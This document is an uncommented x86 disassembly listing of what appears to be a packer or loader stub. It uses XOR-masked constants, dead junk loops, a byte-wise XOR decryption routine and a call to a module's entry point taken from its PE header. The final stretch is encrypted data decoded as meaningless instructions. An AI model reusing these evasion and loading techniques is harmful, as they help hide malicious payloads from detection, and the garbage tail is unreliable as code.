  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41e0ec
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41df70,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41e1c4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41df70
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41e0ec
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41e1c4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41df70
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41e0ec
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41e0ec
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41e0ec
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41e170,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41e168,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41e0ec
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x43001c
  410baa:	or     DWORD PTR ds:0x42f008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x43200c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x43200c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x43200c,ecx
  410be0:	cmp    DWORD PTR ds:0x43200c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x43200c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x4246cd
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42b04c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41df6c
  410c2b:	sbb    DWORD PTR ds:0x43201c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x430004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x430004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x430004,ecx
  410c4d:	cmp    DWORD PTR ds:0x430004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x42b014
  410c65:	cmp    DWORD PTR ds:0x430004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x42f024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x42f024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x42f024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x42b018
  410ca1:	cmp    DWORD PTR ds:0x42f024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x42f024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x42f024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x42f024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x42f024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41e174
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x43001c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x43300c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x43300c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x43300c,ecx
  410d03:	cmp    DWORD PTR ds:0x43300c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42b01c
  410d24:	cmp    DWORD PTR ds:0x43300c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x43300c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x43300c,ecx
  410d40:	cmp    DWORD PTR ds:0x43300c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x433010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41e0ec
  410d65:	sbb    DWORD PTR ds:0x432018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42f01c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x432018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x432018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x432018,ecx
  410da6:	cmp    DWORD PTR ds:0x432018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x432018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x42472f
  410dc5:	push   0x424711
  410dca:	call   DWORD PTR ds:0x42b050
  410dd0:	cmp    DWORD PTR ds:0x432018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x432018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x432018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x430000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x431000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x433010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x42f020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x433010,0x17
  410e47:	cmp    DWORD PTR ds:0x433010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x433010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x42b054
  410e6f:	cmp    DWORD PTR ds:0x433010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x433010
  410e81:	dec    eax
  410e82:	mov    ds:0x433010,eax
  410e87:	mov    eax,ds:0x433010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x433010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x433004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x433004
  410eab:	inc    eax
  410eac:	mov    ds:0x433004,eax
  410eb1:	cmp    DWORD PTR ds:0x433004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x433004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x43201c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x42b058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x433014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x42f000,0x43000c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x43300c,0x430014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x430008,0x42f014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x431018,0x430018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x430004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x433010,0x42f01c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x42f020,0x431018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42f01c,0x42f000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x433010,0x1047
  410f77:	mov    eax,ds:0x41e10c
  410f7c:	and    DWORD PTR ds:0x42f018,0x432010
  410f86:	push   0x41e062
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x431000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x42f008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x433010,0x43300c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x42f010,0x42f014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x432018,0x43300c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x431000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x430008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x430008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x430008,ebx
  410ff5:	cmp    DWORD PTR ds:0x430008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x43300c
  411007:	push   0x433010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42b05c
  411017:	cmp    DWORD PTR ds:0x430008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x430004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x430004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x430004,ebx
  41103d:	cmp    DWORD PTR ds:0x430004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x42b020
  41105d:	cmp    DWORD PTR ds:0x430004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x431018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x432018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41df08
  411086:	mov    ebx,DWORD PTR ds:0x41df0c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x430018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x430018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x430018,ebx
  4110b0:	cmp    DWORD PTR ds:0x430018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x430018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x42b028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x433004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x431004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x431004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x431004,ebx
  411104:	cmp    DWORD PTR ds:0x431004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x42466e
  411116:	call   DWORD PTR ds:0x42b02c
  41111c:	cmp    DWORD PTR ds:0x431004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x431004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x431004,ebx
  411136:	cmp    DWORD PTR ds:0x431004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x432014
  41114a:	sbb    DWORD PTR ds:0x42f000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xd4ed3ad3
  411322:	not    DWORD PTR [edi-0x72]
  411325:	bound  esp,QWORD PTR [edx-0x33]
  411328:	pop    edi
  411329:	bound  esp,QWORD PTR [edx+0x37]
  41132c:	xchg   ebx,eax
  41132d:	push   esi
  41132e:	(bad)  
  41132f:	fist   WORD PTR [edi]
  411331:	fadd   DWORD PTR [ebx+ebx*1+0x7e4a9471]
  411338:	pop    ss
  411339:	jnp    0x411393
  41133b:	pop    edx
  41133c:	popa   
  41133d:	aam    0x5a
  41133f:	sbb    eax,0xf25e9081
  411344:	fwait
  411345:	out    0xd,eax
  411347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411348:	outs   dx,BYTE PTR ds:[esi]
  411349:	cmp    eax,0x56b89230
  41134e:	daa    
  41134f:	sahf   
  411350:	fisubr DWORD PTR [ebp-0x3f0bfa32]
  411356:	aas    
  411357:	repz mov WORD PTR [ecx],fs
  41135a:	leave  
  41135b:	loopne 0x41138a
  41135d:	dec    ecx
  41135e:	js     0x41134b
  411360:	lods   eax,DWORD PTR ds:[esi]
  411361:	popa   
  411362:	sub    eax,ebp
  411364:	add    BYTE PTR [eax+0x47],0xc8
  411368:	dec    esp
  411369:	cli    
  41136a:	push   ecx
  41136b:	icebp  
  41136c:	or     DWORD PTR [ecx+0x271f4e75],edx
  411372:	inc    ebp
  411373:	fwait
  411374:	hlt    
  411375:	pop    ss
  411376:	pushf  
  411377:	pushf  
  411378:	pop    ebx
  411379:	or     eax,0x105d1b13
  41137e:	data16 jae 0x411342
  411381:	mov    esi,0x17c52ae6
  411386:	in     al,0x50
  411388:	pushf  
  411389:	inc    DWORD PTR [edi+0x53]
  41138c:	int3   
  41138d:	icebp  
  41138e:	fisub  WORD PTR [edi]
  411390:	inc    ebx
  411391:	mov    ah,0x14
  411393:	push   es
  411394:	call   0x32f1:0x457cc36
  41139b:	and    al,0x48
  41139d:	ins    DWORD PTR es:[edi],dx
  41139e:	jns    0x4113e8
  4113a0:	call   0x3a5c:0xd867ce7
  4113a7:	(bad)  
  4113a8:	dec    ecx
  4113a9:	adc    edi,ebp
  4113ab:	(bad)  
  4113ac:	push   ss
  4113ad:	fcomip st,st(1)
  4113af:	in     al,dx
  4113b0:	lods   eax,DWORD PTR ds:[esi]
  4113b1:	jg     0x4113b7
  4113b3:	or     BYTE PTR [edi-0x2a],bl
  4113b6:	mov    bh,dh
  4113b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113b9:	retf   
  4113ba:	pop    ebp
  4113bb:	retf   0xf222
  4113be:	jae    0x4113ff
  4113c0:	(bad)  
  4113c1:	fnsave [edi+0x35]
  4113c4:	enter  0xfa2b,0x58
  4113c8:	pop    edx
  4113c9:	into   
  4113ca:	cmp    al,0x65
  4113cc:	test   BYTE PTR [ebx+0x2753dbb1],0x3b
  4113d3:	sub    eax,0x782fb67e
  4113d8:	pop    es
  4113d9:	iretw  
  4113db:	mov    eax,ds:0x2b2e4124
  4113e0:	jns    0x411388
  4113e2:	push   ds
  4113e3:	inc    edx
  4113e4:	jmp    0xab5f:0x4e548f0b
  4113eb:	inc    eax
  4113ec:	js     0x411389
  4113ee:	loope  0x4113e7
  4113f0:	and    bh,BYTE PTR [eax+eiz*4-0x7d]
  4113f4:	shl    BYTE PTR [ebx-0x4a04fcd0],1
  4113fa:	adc    edx,eax
  4113fc:	retf   
  4113fd:	push   edi
  4113fe:	or     BYTE PTR [edi],ah
  411400:	cmp    DWORD PTR [edx+0x5],ebx
  411403:	dec    ebx
  411404:	repz inc eax
  411406:	adc    eax,0xc9d44172
  41140b:	loope  0x411484
  41140d:	rcr    DWORD PTR [eax],cl
  41140f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
